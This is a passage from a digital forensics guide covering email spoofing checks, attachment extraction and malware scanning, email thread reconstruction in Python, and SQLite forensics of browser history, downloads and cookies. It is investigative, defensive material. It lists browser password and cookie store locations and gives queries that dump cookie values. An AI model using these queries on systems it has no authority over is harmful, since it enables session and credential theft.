        print("  ✓ DKIM: PASS")
    elif 'dkim=fail' in dkim_auth.lower():
        warnings.append("DKIM validation failed")
        print("  ❌ DKIM: FAIL")
    else:
        warnings.append("No DKIM signature")
        print("  ⚠ DKIM: Not signed")
    
    # 2. Check header consistency
    print("\n2. HEADER CONSISTENCY CHECK")
    from_header = msg['From']
    return_path = msg['Return-Path']
    
    import email.utils
    from_addr = email.utils.parseaddr(from_header)[1] if from_header else None
    return_addr = return_path.strip('<>') if return_path else None
    
    if from_addr and return_addr and from_addr.lower() != return_addr.lower():
        warnings.append(f"From/Return-Path mismatch: {from_addr} vs {return_addr}")
        print(f"  ❌ From/Return-Path mismatch")
    else:
        print("  ✓ Headers consistent")
    
    # 3. Check for received headers
    print("\n3. RECEIVED HEADERS CHECK")
    received_headers = msg.get_all('Received')
    if not received_headers or len(received_headers) < 1:
        warnings.append("Missing or insufficient Received headers")
        print("  ❌ No Received headers (highly suspicious)")
    else:
        print(f"  ✓ {len(received_headers)} Received headers found")
    
    # 4. Check display name spoofing
    print("\n4. DISPLAY NAME CHECK")
    display_name, email_addr = email.utils.parseaddr(from_header) if from_header else (None, None)
    
    if display_name and email_addr:
        import re
        emails_in_display = re.findall(r'[\w\.-]+@[\w\.-]+', display_name)
        if emails_in_display and emails_in_display[0].lower() != email_addr.lower():
            warnings.append("Display name contains different email address")
            print("  ❌ Display name spoofing detected")
        else:
            print("  ✓ Display name consistent")
    
    # 5. Summary
    print("\n" + "="*50)
    if warnings:
        print("⚠️  SPOOFING INDICATORS DETECTED:")
        for warning in warnings:
            print(f"  - {warning}")
        print("\nRECOMMENDATION: Treat this email as suspicious")
    else:
        print("✓ No obvious spoofing indicators detected")
        print("Note: Absence of indicators doesn't guarantee legitimacy")
    
    return warnings

comprehensive_spoofing_check('suspicious_email.eml')
```

## Attachment Extraction

Forensic attachment extraction preserves evidence integrity while enabling malware analysis and content examination.

**Safe Extraction Environment**

Extract attachments in isolated environment:

- Dedicated forensic workstation
- No network connectivity
- Virtual machine with snapshots
- Malware scanning before opening

**Python Attachment Extraction:**

```python
import email
import os
import hashlib

def extract_attachments_forensic(eml_file, output_dir):
    """
    Forensically sound attachment extraction with metadata preservation
    """
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    with open(eml_file, 'rb') as f:
        msg_bytes = f.read()
        msg_hash = hashlib.sha256(msg_bytes).hexdigest()
    
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    print(f"Source email: {eml_file}")
    print(f"Source hash: {msg_hash}")
    print()
    
    attachment_count = 0
    manifest = []
    
    for part in msg.walk():
        if part.get_content_maintype() == 'multipart':
            continue
        if part.get('Content-Disposition') is None:
            continue
        
        filename = part.get_filename()
        if filename:
            attachment_count += 1
            
            # Sanitize filename
            safe_filename = "".join(c for c in filename if c.isalnum() or c in (' ', '.', '_', '-'))
            safe_filename = f"attachment_{attachment_count:03d}_{safe_filename}"
            
            filepath = os.path.join(output_dir, safe_filename)
            
            # Extract payload
            payload = part.get_payload(decode=True)
            
            if payload:
                # Write attachment
                with open(filepath, 'wb') as f:
                    f.write(payload)
                
                # Calculate hash
                file_hash = hashlib.sha256(payload).hexdigest()
                
                # Determine file type
                import magic
                mime = magic.Magic(mime=True)
                file_type = mime.from_buffer(payload)
                
                # Record metadata
                metadata = {
                    'original_filename': filename,
                    'saved_as': safe_filename,
                    'size': len(payload),
                    'sha256': file_hash,
                    'content_type_declared': part.get_content_type(),
                    'content_type_detected': file_type,
                    'content_disposition': part.get('Content-Disposition'),
                    'source_email': eml_file,
                    'source_email_hash': msg_hash
                }
                
                manifest.append(metadata)
                
                print(f"Extracted: {filename}")
                print(f"  Saved as: {safe_filename}")
                print(f"  Size: {len(payload)} bytes")
                print(f"  SHA256: {file_hash}")
                print(f"  Type (declared): {part.get_content_type()}")
                print(f"  Type (detected): {file_type}")
                
                # Check for type mismatch
                if part.get_content_type() != file_type:
                    print(f"  ⚠️  WARNING: Content type mismatch!")
                
                print()
    
    # Save manifest
    import json
    manifest_file = os.path.join(output_dir, 'extraction_manifest.json')
    with open(manifest_file, 'w') as f:
        json.dump(manifest, f, indent=2)
    
    print(f"Total attachments extracted: {attachment_count}")
    print(f"Manifest saved to: {manifest_file}")
    
    return manifest

extract_attachments_forensic('evidence.eml', 'extracted_attachments/')
```

**Command-Line Extraction:**

```bash
# Using munpack (mpack utilities)
munpack -f message.eml -C output_dir/

# Using ripmime
ripmime -i message.eml -d output_dir/

# Batch extraction from multiple EML files
for eml in *.eml; do
    mkdir "attachments_${eml%.eml}"
    munpack -f "$eml" -C "attachments_${eml%.eml}/"
done
```

**Attachment Type Verification:**

```python
def verify_attachment_types(attachment_dir):
    """
    Verify attachment actual types match declared types
    """
    import os
    import magic
    
    mime = magic.Magic(mime=True)
    mismatches = []
    
    for filename in os.listdir(attachment_dir):
        if filename.endswith('.json'):
            continue
        
        filepath = os.path.join(attachment_dir, filename)
        if not os.path.isfile(filepath):
            continue
        
        # Detect actual type
        actual_type = mime.from_file(filepath)
        
        # Infer expected type from extension
        ext = os.path.splitext(filename)[1].lower()
        expected_types = {
            '.pdf': 'application/pdf',
            '.docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            '.xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            '.zip': 'application/zip',
            '.jpg': 'image/jpeg',
            '.png': 'image/png',
            '.txt': 'text/plain',
            '.exe': 'application/x-dosexec'
        }
        
        expected_type = expected_types.get(ext, 'unknown')
        
        print(f"{filename}:")
        print(f"  Expected: {expected_type}")
        print(f"  Actual: {actual_type}")
        
        if expected_type != 'unknown' and expected_type != actual_type:
            print(f"  ⚠️  TYPE MISMATCH!")
            mismatches.append({
                'filename': filename,
                'expected': expected_type,
                'actual': actual_type
            })
        
        print()
    
    if mismatches:
        print(f"\n⚠️  {len(mismatches)} type mismatches detected")
        print("These files may be malicious or mislabeled")
    
    return mismatches

verify_attachment_types('extracted_attachments/')
```

**Malware Scanning:**

```bash
# Scan extracted attachments with ClamAV
clamscan -r --bell -i extracted_attachments/ > malware_scan_results.txt

# Scan with YARA rules
yara -r malware_rules.yar extracted_attachments/

# Calculate hashes for VirusTotal lookup
find extracted_attachments/ -type f -exec sha256sum {} \; > attachment_hashes.txt
```

**Password-Protected Archive Handling:**

```python
def handle_protected_archives(archive_file):
    """
    Attempt to identify password-protected archives
    """
    import zipfile
    import py7zr
    
    # Check if ZIP is password-protected
    if archive_file.endswith('.zip'):
        try:
            with zipfile.ZipFile(archive_file) as zf:
                # Try to read file list
                file_list = zf.namelist()
                print(f"ZIP contents: {file_list}")
                
                # Try to extract (will fail if password-protected)
                try:
                    zf.extractall('test_extract/')
                    print("ZIP extracted successfully (not password-protected)")
                except RuntimeError as e:
                    if 'password required' in str(e).lower():
                        print("⚠️  ZIP is PASSWORD-PROTECTED")
                        print("Password required for extraction")
                        return 'password-protected'
        except Exception as e:
            print(f"Error processing ZIP: {e}")
    
    # Similar checks for 7z, RAR, etc.
    
    return 'unknown'

handle_protected_archives('suspicious_attachment.zip')
```

**Embedded Object Extraction:**

Some attachments contain embedded objects (OLE, embedded PDFs, etc.):

```bash
# Extract embedded objects from Office documents
oleobj suspicious_document.docx

# Extract objects from PDF
pdfextract suspicious_document.pdf

# Python approach for DOCX
python3 << EOF
import zipfile
import os

with zipfile.ZipFile('document.docx', 'r') as docx:
    # Extract embedded files
    for name in docx.namelist():
        if 'embeddings/' in name or 'media/' in name:
            docx.extract(name, 'embedded_objects/')
            print(f"Extracted: {name}")
EOF
```

**Attachment Timeline:**

Create timeline of when attachments were added to emails:

```python
def create_attachment_timeline(eml_directory):
    """
    Generate timeline of email attachments
    """
    import email
    import email.utils
    import os
    
    timeline = []
    
    for filename in os.listdir(eml_directory):
        if not filename.endswith('.eml'):
            continue
        
        filepath = os.path.join(eml_directory, filename)
        
        with open(filepath, 'r') as f:
            msg = email.message_from_file(f)
        
        date_str = msg['Date']
        if date_str:
            try:
                timestamp = email.utils.parsedate_to_datetime(date_str)
                
                # Count attachments
                attachment_count = sum(1 for part in msg.walk() 
                                     if part.get_filename())
                
                if attachment_count > 0:
                    # Get attachment filenames
                    attachments = [part.get_filename() for part in msg.walk() 
                                 if part.get_filename()]
                    
                    timeline.append({
                        'timestamp': timestamp,
                        'email_file': filename,
                        'subject': msg['Subject'],
                        'from': msg['From'],
                        'attachment_count': attachment_count,
                        'attachments': attachments
                    })
            except:
                pass
    
    # Sort by timestamp
    timeline.sort(key=lambda x: x['timestamp'])
    
    print("=== ATTACHMENT TIMELINE ===\n")
    for entry in timeline:
        print(f"{entry['timestamp']}")
        print(f"  Subject: {entry['subject']}")
        print(f"  From: {entry['from']}")
        print(f"  Attachments ({entry['attachment_count']}):")
        for att in entry['attachments']:
            print(f"    - {att}")
        print()
    
    return timeline

create_attachment_timeline('evidence_emails/')

## Email Threading Reconstruction

Email threading reconstructs conversation chains by analyzing message relationships through headers and metadata. Essential for understanding communication context and timeline.

**Email Threading Concepts**

**Threading Headers:**

**Message-ID:** Unique identifier for each message

Message-ID: [abc123.def456@example.com](mailto:abc123.def456@example.com)

**In-Reply-To:** Message-ID being replied to

In-Reply-To: [previous.message.id@example.com](mailto:previous.message.id@example.com)

**References:** Chain of previous Message-IDs in thread

References: [first.msg@example.com](mailto:first.msg@example.com) [second.msg@example.com](mailto:second.msg@example.com) [third.msg@example.com](mailto:third.msg@example.com)
```

**Thread Reconstruction Algorithm**

```python
import email
import os
from collections import defaultdict
from datetime import datetime

class EmailThread:
    def __init__(self):
        self.messages = {}  # message_id -> message data
        self.children = defaultdict(list)  # parent_id -> [child_ids]
        self.roots = []  # root message IDs (no parent)
    
    def add_message(self, eml_file):
        """Add email to thread structure"""
        with open(eml_file, 'r') as f:
            msg = email.message_from_file(f)
        
        message_id = self._clean_message_id(msg.get('Message-ID', ''))
        if not message_id:
            message_id = f"unknown_{hash(eml_file)}"
        
        # Parse date
        date_str = msg.get('Date', '')
        try:
            import email.utils
            timestamp = email.utils.parsedate_to_datetime(date_str)
        except:
            timestamp = None
        
        # Store message data
        self.messages[message_id] = {
            'message_id': message_id,
            'subject': msg.get('Subject', ''),
            'from': msg.get('From', ''),
            'to': msg.get('To', ''),
            'date': timestamp,
            'in_reply_to': self._clean_message_id(msg.get('In-Reply-To', '')),
            'references': self._parse_references(msg.get('References', '')),
            'file': eml_file
        }
        
        # Build parent-child relationships
        in_reply_to = self.messages[message_id]['in_reply_to']
        if in_reply_to:
            self.children[in_reply_to].append(message_id)
        else:
            # No parent - this is a root message
            self.roots.append(message_id)
    
    def _clean_message_id(self, message_id):
        """Remove < > brackets from Message-ID"""
        if not message_id:
            return ''
        return message_id.strip('<> ')
    
    def _parse_references(self, references):
        """Parse References header into list of Message-IDs"""
        if not references:
            return []
        
        import re
        # Extract all <...> patterns
        refs = re.findall(r'<([^>]+)>', references)
        return refs
    
    def print_thread(self, message_id=None, level=0):
        """Recursively print thread structure"""
        if message_id is None:
            # Print all root threads
            for root_id in sorted(self.roots, 
                                 key=lambda x: self.messages[x]['date'] or datetime.min):
                self.print_thread(root_id, 0)
            return
        
        if message_id not in self.messages:
            return
        
        msg = self.messages[message_id]
        indent = "  " * level
        
        # Print message info
        date_str = msg['date'].strftime('%Y-%m-%d %H:%M:%S') if msg['date'] else 'Unknown'
        print(f"{indent}[{date_str}] {msg['from']}")
        print(f"{indent}  Subject: {msg['subject']}")
        print(f"{indent}  File: {msg['file']}")
        print()
        
        # Print children (replies)
        children = sorted(self.children[message_id],
                         key=lambda x: self.messages[x]['date'] or datetime.min)
        for child_id in children:
            self.print_thread(child_id, level + 1)
    
    def get_thread_statistics(self):
        """Generate thread statistics"""
        stats = {
            'total_messages': len(self.messages),
            'root_threads': len(self.roots),
            'max_depth': 0,
            'participants': set()
        }
        
        # Calculate max depth
        def get_depth(msg_id, current_depth=0):
            max_d = current_depth
            for child_id in self.children[msg_id]:
                max_d = max(max_d, get_depth(child_id, current_depth + 1))
            return max_d
        
        for root_id in self.roots:
            depth = get_depth(root_id)
            stats['max_depth'] = max(stats['max_depth'], depth)
        
        # Count participants
        for msg in self.messages.values():
            if msg['from']:
                stats['participants'].add(msg['from'])
        
        return stats

# Usage
def reconstruct_threads(email_directory):
    """Reconstruct email threads from directory of EML files"""
    
    thread = EmailThread()
    
    print("Loading emails...")
    for filename in os.listdir(email_directory):
        if filename.endswith('.eml'):
            filepath = os.path.join(email_directory, filename)
            thread.add_message(filepath)
    
    print(f"Loaded {len(thread.messages)} messages\n")
    
    # Print statistics
    stats = thread.get_thread_statistics()
    print("=== THREAD STATISTICS ===")
    print(f"Total messages: {stats['total_messages']}")
    print(f"Root threads: {stats['root_threads']}")
    print(f"Maximum thread depth: {stats['max_depth']}")
    print(f"Unique participants: {len(stats['participants'])}")
    print()
    
    # Print thread structure
    print("=== EMAIL THREADS ===\n")
    thread.print_thread()
    
    return thread

reconstruct_threads('email_evidence/')
````

**Subject-Based Threading**

When Message-ID headers are missing or unreliable:

```python
def thread_by_subject(email_directory):
    """Thread emails by subject line (fallback method)"""
    import re
    
    def normalize_subject(subject):
        """Remove Re:, Fwd:, etc. and normalize"""
        if not subject:
            return ''
        
        # Remove prefixes
        subject = re.sub(r'^(Re:|RE:|Fwd:|FW:|Fw:)\s*', '', subject, flags=re.IGNORECASE)
        subject = subject.strip()
        subject = subject.lower()
        return subject
    
    threads = defaultdict(list)
    
    for filename in os.listdir(email_directory):
        if not filename.endswith('.eml'):
            continue
        
        filepath = os.path.join(email_directory, filename)
        with open(filepath, 'r') as f:
            msg = email.message_from_file(f)
        
        subject = msg.get('Subject', '')
        normalized = normalize_subject(subject)
        
        date_str = msg.get('Date', '')
        try:
            import email.utils
            timestamp = email.utils.parsedate_to_datetime(date_str)
        except:
            timestamp = None
        
        threads[normalized].append({
            'file': filename,
            'subject': subject,
            'from': msg.get('From', ''),
            'date': timestamp
        })
    
    # Print threads sorted by subject
    print("=== THREADS BY SUBJECT ===\n")
    
    for subject, messages in sorted(threads.items()):
        if len(messages) > 1:  # Only show threads with multiple messages
            print(f"Subject: {subject}")
            print(f"Messages in thread: {len(messages)}")
            
            # Sort by date
            messages.sort(key=lambda x: x['date'] or datetime.min)
            
            for msg in messages:
                date_str = msg['date'].strftime('%Y-%m-%d %H:%M:%S') if msg['date'] else 'Unknown'
                print(f"  [{date_str}] {msg['from']}")
            print()
    
    return threads

thread_by_subject('email_evidence/')
```

**Thread Visualization**

Generate visual representation of email threads:

```python
def visualize_thread_tree(email_directory, output_file='thread_tree.txt'):
    """Create ASCII tree visualization of email threads"""
    
    thread = EmailThread()
    
    for filename in os.listdir(email_directory):
        if filename.endswith('.eml'):
            filepath = os.path.join(email_directory, filename)
            thread.add_message(filepath)
    
    def build_tree(msg_id, prefix='', is_last=True):
        """Build ASCII tree recursively"""
        lines = []
        
        if msg_id not in thread.messages:
            return lines
        
        msg = thread.messages[msg_id]
        
        # Current message
        connector = '└── ' if is_last else '├── '
        date_str = msg['date'].strftime('%Y-%m-%d %H:%M') if msg['date'] else 'Unknown'
        subject = msg['subject'][:50] + '...' if len(msg['subject']) > 50 else msg['subject']
        
        lines.append(f"{prefix}{connector}[{date_str}] {subject}")
        
        # Children
        children = thread.children[msg_id]
        for i, child_id in enumerate(children):
            is_last_child = (i == len(children) - 1)
            extension = '    ' if is_last else '│   '
            lines.extend(build_tree(child_id, prefix + extension, is_last_child))
        
        return lines
    
    output_lines = ['=== EMAIL THREAD TREE ===\n']
    
    for root_id in thread.roots:
        output_lines.extend(build_tree(root_id))
        output_lines.append('')
    
    # Write to file
    with open(output_file, 'w') as f:
        f.write('\n'.join(output_lines))
    
    print(f"Thread tree visualization saved to {output_file}")
    
    # Also print to console
    print('\n'.join(output_lines))

visualize_thread_tree('email_evidence/')
```

**Timeline-Based Thread View**

View threads in chronological order:

```python
def create_chronological_thread_view(email_directory):
    """Display all emails in chronological order with thread indicators"""
    
    messages = []
    
    for filename in os.listdir(email_directory):
        if not filename.endswith('.eml'):
            continue
        
        filepath = os.path.join(email_directory, filename)
        with open(filepath, 'r') as f:
            msg = email.message_from_file(f)
        
        date_str = msg.get('Date', '')
        try:
            import email.utils
            timestamp = email.utils.parsedate_to_datetime(date_str)
        except:
            timestamp = datetime.min
        
        message_id = msg.get('Message-ID', '').strip('<> ')
        in_reply_to = msg.get('In-Reply-To', '').strip('<> ')
        
        messages.append({
            'timestamp': timestamp,
            'subject': msg.get('Subject', ''),
            'from': msg.get('From', ''),
            'to': msg.get('To', ''),
            'message_id': message_id,
            'in_reply_to': in_reply_to,
            'is_reply': bool(in_reply_to),
            'file': filename
        })
    
    # Sort chronologically
    messages.sort(key=lambda x: x['timestamp'])
    
    print("=== CHRONOLOGICAL THREAD VIEW ===\n")
    
    for msg in messages:
        date_str = msg['timestamp'].strftime('%Y-%m-%d %H:%M:%S') if msg['timestamp'] != datetime.min else 'Unknown'
        reply_indicator = '↳ RE: ' if msg['is_reply'] else ''
        
        print(f"[{date_str}]")
        print(f"  {reply_indicator}{msg['subject']}")
        print(f"  From: {msg['from']}")
        print(f"  To: {msg['to']}")
        print(f"  File: {msg['file']}")
        print()
    
    return messages

create_chronological_thread_view('email_evidence/')
```

**Orphaned Message Detection**

Identify messages referencing non-existent parents:

```python
def detect_orphaned_messages(email_directory):
    """Find messages with missing parent emails"""
    
    thread = EmailThread()
    
    for filename in os.listdir(email_directory):
        if filename.endswith('.eml'):
            filepath = os.path.join(email_directory, filename)
            thread.add_message(filepath)
    
    orphans = []
    
    for msg_id, msg_data in thread.messages.items():
        in_reply_to = msg_data['in_reply_to']
        
        if in_reply_to and in_reply_to not in thread.messages:
            orphans.append({
                'message_id': msg_id,
                'missing_parent': in_reply_to,
                'subject': msg_data['subject'],
                'from': msg_data['from'],
                'date': msg_data['date'],
                'file': msg_data['file']
            })
    
    if orphans:
        print("=== ORPHANED MESSAGES (Missing Parent Emails) ===\n")
        print(f"Found {len(orphans)} orphaned messages\n")
        
        for orphan in orphans:
            print(f"Subject: {orphan['subject']}")
            print(f"From: {orphan['from']}")
            print(f"Date: {orphan['date']}")
            print(f"Missing parent: {orphan['missing_parent']}")
            print(f"File: {orphan['file']}")
            print("Note: Parent email may have been deleted or not collected")
            print()
    else:
        print("No orphaned messages found - all threads are complete")
    
    return orphans

detect_orphaned_messages('email_evidence/')
```

**Thread Export to JSON**

Export thread structure for further analysis:

```python
def export_threads_to_json(email_directory, output_file='threads.json'):
    """Export thread structure to JSON format"""
    import json
    
    thread = EmailThread()
    
    for filename in os.listdir(email_directory):
        if filename.endswith('.eml'):
            filepath = os.path.join(email_directory, filename)
            thread.add_message(filepath)
    
    # Convert to JSON-serializable format
    export_data = {
        'messages': {},
        'threads': []
    }
    
    # Export all messages
    for msg_id, msg_data in thread.messages.items():
        export_data['messages'][msg_id] = {
            'message_id': msg_id,
            'subject': msg_data['subject'],
            'from': msg_data['from'],
            'to': msg_data['to'],
            'date': msg_data['date'].isoformat() if msg_data['date'] else None,
            'in_reply_to': msg_data['in_reply_to'],
            'references': msg_data['references'],
            'file': msg_data['file']
        }
    
    # Export thread structure
    def build_thread_structure(msg_id):
        """Recursively build thread structure"""
        children = []
        for child_id in thread.children[msg_id]:
            children.append(build_thread_structure(child_id))
        
        return {
            'message_id': msg_id,
            'children': children
        }
    
    for root_id in thread.roots:
        export_data['threads'].append(build_thread_structure(root_id))
    
    # Write to JSON file
    with open(output_file, 'w') as f:
        json.dump(export_data, f, indent=2)
    
    print(f"Thread data exported to {output_file}")
    
    return export_data

export_threads_to_json('email_evidence/', 'threads.json')
```

**Thread Analysis Report**

Generate comprehensive thread analysis:

```python
def generate_thread_report(email_directory, output_file='thread_report.txt'):
    """Generate detailed thread analysis report"""
    
    thread = EmailThread()
    
    for filename in os.listdir(email_directory):
        if filename.endswith('.eml'):
            filepath = os.path.join(email_directory, filename)
            thread.add_message(filepath)
    
    report = []
    report.append("="*70)
    report.append("EMAIL THREAD ANALYSIS REPORT")
    report.append("="*70)
    report.append("")
    
    # Statistics
    stats = thread.get_thread_statistics()
    report.append("SUMMARY STATISTICS")
    report.append("-"*70)
    report.append(f"Total messages analyzed: {stats['total_messages']}")
    report.append(f"Number of conversation threads: {stats['root_threads']}")
    report.append(f"Maximum thread depth: {stats['max_depth']}")
    report.append(f"Unique participants: {len(stats['participants'])}")
    report.append("")
    
    # Participants
    report.append("PARTICIPANTS")
    report.append("-"*70)
    for participant in sorted(stats['participants']):
        # Count messages per participant
        count = sum(1 for msg in thread.messages.values() if msg['from'] == participant)
        report.append(f"  {participant} ({count} messages)")
    report.append("")
    
    # Thread details
    report.append("THREAD DETAILS")
    report.append("-"*70)
    
    for i, root_id in enumerate(thread.roots, 1):
        report.append(f"\nThread #{i}")
        report.append("-"*40)
        
        def count_thread_messages(msg_id):
            """Count total messages in thread"""
            count = 1
            for child_id in thread.children[msg_id]:
                count += count_thread_messages(child_id)
            return count
        
        msg_count = count_thread_messages(root_id)
        root_msg = thread.messages[root_id]
        
        report.append(f"Root subject: {root_msg['subject']}")
        report.append(f"Started by: {root_msg['from']}")
        report.append(f"Started on: {root_msg['date']}")
        report.append(f"Total messages in thread: {msg_count}")
        report.append("")
    
    # Write report
    report_text = '\n'.join(report)
    with open(output_file, 'w') as f:
        f.write(report_text)
    
    print(report_text)
    print(f"\nReport saved to {output_file}")
    
    return report_text

generate_thread_report('email_evidence/', 'thread_analysis_report.txt')
```

**Forensic Threading Workflow**

Complete workflow for email thread reconstruction:

```bash
#!/bin/bash
# Email threading forensic workflow

EVIDENCE_DIR="email_evidence"
OUTPUT_DIR="thread_analysis"

mkdir -p "$OUTPUT_DIR"

echo "=== EMAIL THREADING FORENSIC ANALYSIS ==="
echo

# 1. Preserve evidence
echo "[1/6] Preserving evidence integrity..."
find "$EVIDENCE_DIR" -name "*.eml" -exec sha256sum {} \; > "$OUTPUT_DIR/evidence_hashes.txt"

# 2. Reconstruct threads
echo "[2/6] Reconstructing email threads..."
python3 thread_reconstruction.py "$EVIDENCE_DIR" > "$OUTPUT_DIR/thread_structure.txt"

# 3. Generate timeline
echo "[3/6] Creating chronological timeline..."
python3 chronological_view.py "$EVIDENCE_DIR" > "$OUTPUT_DIR/timeline.txt"

# 4. Detect orphans
echo "[4/6] Detecting orphaned messages..."
python3 detect_orphans.py "$EVIDENCE_DIR" > "$OUTPUT_DIR/orphaned_messages.txt"

# 5. Create visualization
echo "[5/6] Generating thread visualization..."
python3 visualize_threads.py "$EVIDENCE_DIR" > "$OUTPUT_DIR/thread_tree.txt"

# 6. Export data
echo "[6/6] Exporting thread data..."
python3 export_threads.py "$EVIDENCE_DIR" "$OUTPUT_DIR/threads.json"

echo
echo "Analysis complete. Results saved to $OUTPUT_DIR/"
```

---

**Related Critical Topics:** Log Analysis (Mail Server Logs), Malware Analysis (Email-Borne Threats), OSINT (Email Header Attribution), Phishing Investigation Techniques

---

# Database Forensics

## SQLite Database Recovery

SQLite is a self-contained, serverless database engine widely used in applications, browsers, mobile apps, and system components. Its single-file architecture makes it prevalent in forensic investigations.

### SQLite File Structure

**Database components:**

```
database.db           - Main database file
database.db-wal       - Write-Ahead Log (transaction journal)
database.db-shm       - Shared memory index
database.db-journal   - Rollback journal (legacy mode)
```

**File format:**

```
Header (100 bytes):
Offset 0x00 (16 bytes): Magic string "SQLite format 3\000"
Offset 0x10 (2 bytes):  Page size (512-65536, power of 2)
Offset 0x12 (1 byte):   File format write version
Offset 0x13 (1 byte):   File format read version
Offset 0x14 (1 byte):   Reserved space per page
Offset 0x18 (4 bytes):  File change counter
Offset 0x1C (4 bytes):  Database size in pages
Offset 0x20 (4 bytes):  First freelist trunk page
Offset 0x24 (4 bytes):  Total freelist pages
Offset 0x28 (4 bytes):  Schema cookie
Offset 0x2C (4 bytes):  Schema format number
Offset 0x30 (4 bytes):  Default page cache size
Offset 0x34 (4 bytes):  Largest root b-tree page
Offset 0x38 (4 bytes):  Database text encoding (1=UTF-8, 2=UTF-16le, 3=UTF-16be)
Offset 0x3C (4 bytes):  User version
Offset 0x40 (4 bytes):  Incremental vacuum mode
Offset 0x44 (4 bytes):  Application ID
Offset 0x60 (4 bytes):  Version-valid-for number
Offset 0x64 (4 bytes):  SQLite version number
```

**Page types:**

- Page 1: Database header + root page
- B-tree pages: Internal nodes and leaf nodes
- Freelist pages: Available for reuse
- Overflow pages: Large data spanning multiple pages
- Pointer map pages: Used in auto-vacuum mode

### Identifying SQLite Databases

**File signature detection:**

```bash
# Check magic bytes
xxd -l 16 database.db
# Should show: "53 51 4c 69 74 65 20 66 6f 72 6d 61 74 20 33 00"

# Using file command
file database.db
# Output: SQLite 3.x database

# Find all SQLite databases on disk
find /mnt/win/ -type f -exec file {} \; | grep -i sqlite

# Search by signature in raw image
xxd disk.raw | grep "5351 4c69 7465 2066 6f72 6d61 7420 33"
```

**Common SQLite locations:**

**Windows:**

```
# Browser data
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\
├── History                    - Browsing history
├── Cookies                    - Stored cookies
├── Login Data                 - Saved passwords
├── Web Data                   - Autofill data
└── Favicons                   - Website icons

C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\
├── places.sqlite              - History and bookmarks
├── cookies.sqlite             - Cookies
├── formhistory.sqlite         - Form data
└── logins.json                - Passwords (JSON, not SQLite)

# Windows 10/11 Timeline
C:\Users\<user>\AppData\Local\ConnectedDevicesPlatform\L.<user>\ActivitiesCache.db

# Windows Notifications
C:\Users\<user>\AppData\Local\Microsoft\Windows\Notifications\wpndatabase.db

# Cortana/Search
C:\Users\<user>\AppData\Local\Packages\Microsoft.Windows.Cortana_*\LocalState\ESEDatabaseStore\

# Skype
C:\Users\<user>\AppData\Roaming\Skype\<username>\main.db

# iMessage (if synced)
C:\Users\<user>\AppData\Roaming\Apple Computer\MobileSync\Backup\*\3d0d7e5fb2ce288813306e4d4636395e047a3d28
```

**Linux:**

```
# Firefox
~/.mozilla/firefox/*.default/places.sqlite

# Chrome/Chromium
~/.config/google-chrome/Default/History
~/.config/chromium/Default/History

# Thumbnails
~/.cache/thumbnails/*.db
```

**Android:**

```
/data/data/com.android.providers.contacts/databases/contacts2.db
/data/data/com.android.providers.telephony/databases/mmssms.db
/data/data/com.google.android.gms/databases/
```

**iOS:**

```
/private/var/mobile/Library/SMS/sms.db          - Text messages
/private/var/mobile/Library/CallHistory/call_history.db
/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb
```

### Basic SQLite Querying

**Using sqlite3 command-line:**

```bash
# Open database
sqlite3 database.db

# List all tables
.tables

# Show schema
.schema

# Show schema for specific table
.schema table_name

# Describe table structure
PRAGMA table_info(table_name);

# Query data
SELECT * FROM table_name;

# Export to CSV
.mode csv
.output output.csv
SELECT * FROM table_name;
.quit
```

**Common SQLite metadata queries:**

```sql
-- List all tables
SELECT name FROM sqlite_master WHERE type='table';

-- List all indexes
SELECT name FROM sqlite_master WHERE type='index';

-- Show table row count
SELECT COUNT(*) FROM table_name;

-- Get database file size info
PRAGMA page_count;
PRAGMA page_size;
-- Total size = page_count * page_size

-- Check encoding
PRAGMA encoding;

-- Get user version (application-defined)
PRAGMA user_version;

-- Get application ID
PRAGMA application_id;

-- Show freelist pages (potential deleted data)
PRAGMA freelist_count;
```

### Browser History Forensics

**Chrome/Chromium History:**

```bash
sqlite3 History << 'EOF'
.mode csv
.output chrome_history.csv
SELECT 
    datetime(last_visit_time/1000000-11644473600, 'unixepoch') as visit_time,
    url,
    title,
    visit_count,
    typed_count,
    hidden
FROM urls 
ORDER BY last_visit_time DESC;
.quit
EOF
```

**Chrome visits with timestamps:**

```sql
SELECT 
    datetime(visits.visit_time/1000000-11644473600, 'unixepoch') as visit_time,
    urls.url,
    urls.title,
    visits.visit_duration,
    visits.transition
FROM visits
JOIN urls ON visits.url = urls.id
ORDER BY visits.visit_time DESC;
```

**Chrome Downloads:**

```sql
-- From History database
SELECT 
    datetime(start_time/1000000-11644473600, 'unixepoch') as download_time,
    datetime(end_time/1000000-11644473600, 'unixepoch') as completion_time,
    target_path,
    tab_url,
    total_bytes,
    received_bytes,
    state,  -- 0=in progress, 1=complete, 2=cancelled, 3=interrupted, 4=dangerous
    danger_type,
    interrupt_reason
FROM downloads
ORDER BY start_time DESC;
```

**Chrome Cookies:**

```bash
sqlite3 Cookies << 'EOF'
SELECT 
    host_key,
    name,
    value,
    path,
    datetime(creation_utc/1000000-11644473600, 'unixepoch') as created,
    datetime(expires_utc/1000000-11644473600, 'unixepoch') as expires,
    datetime(last_access_utc/1000000-11644473600, 'unixepoch') as last_access,
    is_secure,
    is_httponly,
    has_expires,
    is_persistent
FROM cookies
ORDER BY creation_utc DESC;
.quit
EOF
```

**Firefox places.sqlite (History & Bookmarks):**

```sql
-- History
SELECT 
    datetime(moz_historyvisits.visit_date/1000000, 'unixepoch') as visit_time,
    moz_places.url,
    moz_places.title,
    moz_places.visit_count,
    moz_places.hidden,
    moz_places.typed,
    moz_historyvisits.visit_type,
    moz_historyvisits.from_visit
FROM moz_places
JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
ORDER BY moz_historyvisits.visit_date DESC;

-- Bookmarks
SELECT 
    moz_bookmarks.title,
    moz_places.url,
    datetime(moz_bookmarks.dateAdded/1000000, 'unixepoch') as date_added,
    datetime(moz_bookmarks.lastModified/1000000, 'unixepoch') as last_modified,
    moz_bookmarks.position
FROM moz_bookmarks
JOIN moz_places ON moz_bookmarks.fk = moz_places.id
WHERE moz_bookmarks.type = 1  -- 1=bookmark, 2=folder, 3=separator
ORDER BY moz_bookmarks.dateAdded DESC;
```

**Firefox Downloads:**

```sql
-- places.sqlite
